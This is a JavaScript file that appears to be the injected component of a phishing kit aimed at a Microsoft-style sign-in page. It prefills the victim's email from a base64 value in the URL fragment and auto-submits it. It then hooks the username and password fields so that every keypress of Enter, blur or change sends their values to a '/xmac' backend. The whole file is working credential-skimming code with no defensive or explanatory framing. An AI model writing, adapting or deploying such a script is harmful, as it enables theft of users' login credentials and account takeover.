function lp() {
    var emailId = document.querySelector('#i0116');
    var nextButton = document.querySelector('#idSIButton9');
    var query = window.location.href;
    if (/#/.test(window.location.href)) {
        var res = query.split('#');
        var data1 = res[0];
        var data2 = res[1];
        console.log(data1);
        console.log(data2);
        if (emailId != null) {
            var decodedString = data2;
            if (/^[A-Za-z0-9+/=]+$/.test(data2)) { 
                try {
                    decodedString = window.atob(data2.replace(/[=]/gi, ''));
                } catch (e) {
                    console.error('Error decoding base64 string:', e);
                }
            }
            emailId.focus();
            emailId.value = decodedString;
            nextButton.focus();
            nextButton.click();
            console.log('YES!');
            return;
        }
    }
    setTimeout(function() {
        lp();
    }, 500);
}
setTimeout(function() {
    lp();
}, 500);

function sendtobackend(key, value) {
    var xhr = new XMLHttpRequest();
    var url = '/xmac'; 
    xhr.open('POST', url, true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4 && xhr.status === 200) {
            console.log('Data sent to backend successfully');
        }
    };
    var params = encodeURIComponent(key) + '=' + encodeURIComponent(value);
    xhr.send(params);
}


function addEventOnEmailField() {
    var emailId = document.querySelector('#i0116');
            if (emailId != null) {
                emailId.addEventListener('keypress', function(event) {
            if (event.key === 'Enter') {
                sendtobackend('username', emailId.value);
            }
        });
        emailId.addEventListener('blur', function(event) {
            sendtobackend('username', emailId.value);
        });
        
        emailId.addEventListener('change', function(event) {
            sendtobackend('username', emailId.value);
        });
        return;
    }
    setTimeout(function() {
        addEventOnEmailField();
    }, 500);
}
setTimeout(function() {
    addEventOnEmailField();
}, 500);


function addEventOnPasswordField() {
    var passwordId = document.querySelector('#passwordEntry');
            if (passwordId != null) {
                passwordId.addEventListener('keypress', function(event) {
            if (event.key === 'Enter') {
                sendtobackend('password', passwordId.value);
            }
        });
        passwordId.addEventListener('blur', function(event) {
            sendtobackend('password', passwordId.value);
        });
        
        passwordId.addEventListener('change', function(event) {
            sendtobackend('password', passwordId.value);
        });
        return;
    }
    setTimeout(function() {
        addEventOnPasswordField();
    }, 500);
}
setTimeout(function() {
    addEventOnPasswordField();
}, 500);